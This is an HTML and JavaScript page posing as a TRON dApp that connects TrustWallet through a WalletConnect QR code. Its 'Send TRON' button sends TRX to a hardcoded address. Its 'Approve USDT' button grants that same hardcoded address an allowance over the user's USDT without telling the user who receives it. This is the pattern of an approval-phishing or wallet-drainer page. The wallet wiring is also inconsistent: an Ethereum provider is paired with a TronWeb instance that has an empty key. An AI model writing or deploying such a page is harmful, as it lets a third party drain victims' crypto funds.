<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON dApp - WalletConnect</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .header p {
            color: #666;
            font-size: 14px;
        }

        .connect-section {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
        }

        .btn {
            width: 100%;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: #f0f0f0;
            color: #333;
            margin-top: 10px;
        }

        .btn-secondary:hover:not(:disabled) {
            background: #e0e0e0;
        }

        .wallet-info {
            background: #f9f9f9;
            border-left: 4px solid #667eea;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            display: none;
        }

        .wallet-info.active {
            display: block;
        }

        .wallet-info p {
            color: #666;
            font-size: 13px;
            margin-bottom: 8px;
            word-break: break-all;
        }

        .wallet-info p strong {
            color: #333;
            display: block;
            margin-bottom: 4px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }

        .form-group input:disabled {
            background: #f5f5f5;
            cursor: not-allowed;
        }

        .section {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
        }

        .section:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }

        .section h3 {
            color: #333;
            font-size: 16px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }

        .section h3::before {
            content: '';
            display: inline-block;
            width: 4px;
            height: 20px;
            background: #667eea;
            border-radius: 2px;
            margin-right: 10px;
        }

        .status {
            padding: 12px 15px;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 13px;
            display: none;
        }

        .status.active {
            display: block;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .status.loading {
            background: #cfe2ff;
            color: #084298;
            border: 1px solid #b6d4fe;
        }

        .status a {
            color: inherit;
            font-weight: 600;
            text-decoration: underline;
        }

        .tx-hash {
            word-break: break-all;
            margin-top: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .balance {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
        }

        .qr-container {
            display: none;
            text-align: center;
            margin: 20px 0;
            padding: 20px;
            background: #f9f9f9;
            border-radius: 8px;
            border: 2px solid #e0e0e0;
        }

        .qr-container.active {
            display: block;
        }

        .qr-container canvas {
            max-width: 220px;
            height: auto;
            border: 3px solid #667eea;
            border-radius: 12px;
            background: white;
            margin: 0 auto;
            display: block;
            padding: 10px;
        }

        .qr-label {
            color: #333;
            font-size: 14px;
            margin-top: 15px;
            font-weight: 600;
        }

        .qr-info {
            background: #e7f3ff;
            border-left: 4px solid #2196F3;
            padding: 12px;
            border-radius: 6px;
            margin-top: 10px;
            font-size: 12px;
            color: #1976D2;
            line-height: 1.5;
        }

        .uri-display {
            background: #f5f5f5;
            padding: 8px;
            border-radius: 6px;
            font-size: 10px;
            word-break: break-all;
            margin-top: 10px;
            color: #666;
            max-height: 60px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 TRON dApp</h1>
            <p>Send TRON & Approve USDT via TrustWallet</p>
        </div>

        <!-- Wallet Connection Section -->
        <div class="connect-section">
            <button id="connectBtn" class="btn btn-primary">🔗 Connect TrustWallet</button>
            <button id="disconnectBtn" class="btn btn-secondary" style="display: none;">🔌 Disconnect</button>
            
            <!-- QR Code Container -->
            <div id="qrContainer" class="qr-container">
                <div id="qrCode"></div>
                <div class="qr-label">📱 Scan with TrustWallet</div>
                <div class="qr-info">
                    ✓ Persistent QR Code (No Expiry)<br>
                    Open TrustWallet Scanner & scan this code
                </div>
                <div class="uri-display" id="uriDisplay"></div>
            </div>

            <div id="walletInfo" class="wallet-info">
                <p><strong>✓ Connected Wallet:</strong> <span id="walletAddress"></span></p>
                <p id="balance" class="balance"></p>
            </div>
        </div>

        <!-- Send TRON Section -->
        <div class="section">
            <h3>Send TRON</h3>
            <div class="form-group">
                <label for="tronAmount">Amount (TRX):</label>
                <input 
                    type="number" 
                    id="tronAmount" 
                    placeholder="Enter amount in TRX" 
                    step="0.1"
                    min="0"
                    disabled
                >
            </div>
            <button id="sendTronBtn" class="btn btn-primary" disabled>💸 Send TRON</button>
            <div id="tronStatus" class="status"></div>
        </div>

        <!-- Approve USDT Section -->
        <div class="section">
            <h3>Approve USDT</h3>
            <div class="form-group">
                <label for="usdtAmount">Amount (USDT):</label>
                <input 
                    type="number" 
                    id="usdtAmount" 
                    placeholder="Enter amount to approve" 
                    step="0.01"
                    min="0"
                    disabled
                >
            </div>
            <button id="approveUsdtBtn" class="btn btn-primary" disabled>✅ Approve USDT</button>
            <div id="usdtStatus" class="status"></div>
        </div>
    </div>

    <!-- Load QRCode first (no dependencies) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

    <!-- Load WalletConnect -->
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    
    <!-- Load Web3 -->
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>

    <!-- Load TronWeb last -->
    <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>

    <script>
        // Wait for TronWeb to be available
        function waitForTronWeb() {
            return new Promise((resolve) => {
                const checkTronWeb = setInterval(() => {
                    if (typeof TronWeb !== 'undefined') {
                        clearInterval(checkTronWeb);
                        resolve();
                    }
                }, 100);
                setTimeout(() => {
                    clearInterval(checkTronWeb);
                    resolve();
                }, 5000);
            });
        }

        // Configuration
        const CONFIG = {
            PROJECT_ID: '171db6da15a54effc1b4a06f889a3c3f',
            RECEIVING_ADDRESS: 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV',
            USDT_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            RPC_URL: 'https://api.trongrid.io',
            CHAIN_ID: 1
        };

        // State
        let web3Provider = null;
        let tronWeb = null;
        let currentAccount = null;
        let wcUri = null;

        // UI Elements
        const connectBtn = document.getElementById('connectBtn');
        const disconnectBtn = document.getElementById('disconnectBtn');
        const qrContainer = document.getElementById('qrContainer');
        const qrCode = document.getElementById('qrCode');
        const uriDisplay = document.getElementById('uriDisplay');
        const walletInfo = document.getElementById('walletInfo');
        const walletAddress = document.getElementById('walletAddress');
        const balanceEl = document.getElementById('balance');
        const tronAmountInput = document.getElementById('tronAmount');
        const sendTronBtn = document.getElementById('sendTronBtn');
        const tronStatus = document.getElementById('tronStatus');
        const usdtAmountInput = document.getElementById('usdtAmount');
        const approveUsdtBtn = document.getElementById('approveUsdtBtn');
        const usdtStatus = document.getElementById('usdtStatus');

        // Initialize TronWeb
        async function initTronWeb(address) {
            try {
                // Wait for TronWeb to load
                await waitForTronWeb();
                
                if (typeof TronWeb === 'undefined') {
                    console.error('TronWeb not available');
                    return false;
                }

                tronWeb = new TronWeb({
                    fullHost: CONFIG.RPC_URL,
                    privateKey: '',
                    headers: { 'YWVT-UUID': 'YOUR-UUID-HERE' }
                });
                
                console.log('TronWeb initialized successfully');
                return true;
            } catch (error) {
                console.error('Error initializing TronWeb:', error);
                return false;
            }
        }

        // Generate QR Code
        function generateQRCode(uri) {
            wcUri = uri;
            qrCode.innerHTML = '';
            uriDisplay.textContent = uri;

            if (typeof QRCode !== 'undefined') {
                new QRCode(qrCode, {
                    text: uri,
                    width: 220,
                    height: 220,
                    colorDark: '#667eea',
                    colorLight: '#ffffff',
                    correctLevel: QRCode.CorrectLevel.H
                });
            }

            qrContainer.classList.add('active');
            console.log('QR Code generated with URI:', uri);
        }

        // Connect Wallet
        connectBtn.addEventListener('click', async () => {
            try {
                showStatus(tronStatus, '<span class="loader"></span>Connecting wallet...', 'loading');
                
                // Create WalletConnect provider
                const provider = new WalletConnectProvider.default({
                    infuraId: CONFIG.PROJECT_ID,
                    chainId: 195,
                    rpc: {
                        195: CONFIG.RPC_URL
                    }
                });

                // Get URI and display QR
                provider.on('display_uri', (uri) => {
                    console.log('WalletConnect URI:', uri);
                    generateQRCode(uri);
                    showStatus(tronStatus, '📱 QR Code displayed. Scan with TrustWallet', 'info');
                });

                // Subscribe to connection events
                provider.on('connect', (payload) => {
                    console.log('Connected:', payload);
                    const { accounts } = payload;
                    if (accounts && accounts.length > 0) {
                        onWalletConnected(accounts[0]);
                    }
                });

                provider.on('disconnect', () => {
                    onWalletDisconnected();
                });

                // Connect
                await provider.enable();
                web3Provider = provider;

            } catch (error) {
                console.error('Connection error:', error);
                showStatus(tronStatus, `Error: ${error.message}`, 'error');
            }
        });

        // Wallet Connected Handler
        async function onWalletConnected(address) {
            currentAccount = address;
            const initialized = await initTronWeb(address);
            
            if (!initialized) {
                showStatus(tronStatus, 'Error initializing wallet', 'error');
                return;
            }

            walletAddress.textContent = address.substring(0, 20) + '...';
            walletInfo.classList.add('active');
            connectBtn.style.display = 'none';
            disconnectBtn.style.display = 'block';
            qrContainer.classList.remove('active');
            tronAmountInput.disabled = false;
            sendTronBtn.disabled = false;
            usdtAmountInput.disabled = false;
            approveUsdtBtn.disabled = false;

            fetchBalance(address);
            clearStatus(tronStatus);
            clearStatus(usdtStatus);
            showStatus(tronStatus, `✓ Connected: ${address.substring(0, 15)}...`, 'success');
        }

        // Disconnect Wallet
        disconnectBtn.addEventListener('click', () => {
            onWalletDisconnected();
        });

        function onWalletDisconnected() {
            currentAccount = null;
            web3Provider = null;
            tronWeb = null;

            walletInfo.classList.remove('active');
            connectBtn.style.display = 'block';
            disconnectBtn.style.display = 'none';
            tronAmountInput.disabled = true;
            sendTronBtn.disabled = true;
            usdtAmountInput.disabled = true;
            approveUsdtBtn.disabled = true;
            tronAmountInput.value = '';
            usdtAmountInput.value = '';

            clearStatus(tronStatus);
            clearStatus(usdtStatus);

            if (wcUri) {
                generateQRCode(wcUri);
            }
        }

        // Fetch Balance
        async function fetchBalance(address) {
            try {
                const response = await fetch(`${CONFIG.RPC_URL}/v1/accounts/${address}`);
                const data = await response.json();
                const balanceSun = data.data && data.data[0] ? data.data[0].balance : 0;
                const balanceTRX = balanceSun / 1000000;
                balanceEl.textContent = `💰 Balance: ${balanceTRX.toFixed(6)} TRX`;
            } catch (error) {
                console.error('Error fetching balance:', error);
                balanceEl.textContent = '💰 Balance: Unable to fetch';
            }
        }

        // Send TRON
        sendTronBtn.addEventListener('click', async () => {
            const amount = parseFloat(tronAmountInput.value);
            
            if (!amount || amount <= 0) {
                showStatus(tronStatus, 'Please enter a valid amount', 'error');
                return;
            }

            if (!currentAccount || !tronWeb) {
                showStatus(tronStatus, 'Wallet not connected', 'error');
                return;
            }

            try {
                showStatus(tronStatus, '<span class="loader"></span>Preparing transaction...', 'loading');
                sendTronBtn.disabled = true;

                const tx = await tronWeb.transactionBuilder.sendTrx(
                    CONFIG.RECEIVING_ADDRESS,
                    tronWeb.toSun(amount)
                );

                const signedTx = await tronWeb.trx.sign(tx);
                const result = await tronWeb.trx.sendRawTransaction(signedTx);

                if (result.result) {
                    showStatus(
                        tronStatus,
                        `✓ Success! <a href="https://tronscan.org/#/transaction/${result.txid}" target="_blank">View on TronScan</a>`,
                        'success'
                    );
                    tronAmountInput.value = '';
                    fetchBalance(currentAccount);
                } else {
                    showStatus(tronStatus, `Error: ${result.message}`, 'error');
                }
            } catch (error) {
                console.error('Send error:', error);
                showStatus(tronStatus, `Error: ${error.message}`, 'error');
            } finally {
                sendTronBtn.disabled = false;
            }
        });

        // Approve USDT
        approveUsdtBtn.addEventListener('click', async () => {
            const amount = parseFloat(usdtAmountInput.value);
            
            if (!amount || amount <= 0) {
                showStatus(usdtStatus, 'Please enter a valid amount', 'error');
                return;
            }

            if (!currentAccount || !tronWeb) {
                showStatus(usdtStatus, 'Wallet not connected', 'error');
                return;
            }

            try {
                showStatus(usdtStatus, '<span class="loader"></span>Approving USDT...', 'loading');
                approveUsdtBtn.disabled = true;

                const abi = [
                    {
                        "constant": false,
                        "inputs": [
                            { "name": "_spender", "type": "address" },
                            { "name": "_value", "type": "uint256" }
                        ],
                        "name": "approve",
                        "outputs": [{ "name": "", "type": "bool" }],
                        "type": "function"
                    }
                ];

                const usdtAmount = amount * 1000000;

                const contract = tronWeb.contract(abi, CONFIG.USDT_CONTRACT);
                const tx = await contract.approve(
                    CONFIG.RECEIVING_ADDRESS,
                    usdtAmount
                ).send();

                showStatus(
                    usdtStatus,
                    `✓ Success! <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">View on TronScan</a>`,
                    'success'
                );
                usdtAmountInput.value = '';

            } catch (error) {
                console.error('Approval error:', error);
                showStatus(usdtStatus, `Error: ${error.message}`, 'error');
            } finally {
                approveUsdtBtn.disabled = false;
            }
        });

        // Utility Functions
        function showStatus(element, message, type) {
            element.className = `status active ${type}`;
            element.innerHTML = message;
        }

        function clearStatus(element) {
            element.className = 'status';
            element.innerHTML = '';
        }

        // Auto-refresh balance every 30 seconds
        setInterval(() => {
            if (currentAccount) {
                fetchBalance(currentAccount);
            }
        }, 30000);

        // Initialize TronWeb on page load
        window.addEventListener('load', async () => {
            await waitForTronWeb();
            console.log('Page loaded. Ready to connect wallet.');
        });
    </script>
</body>
</html>
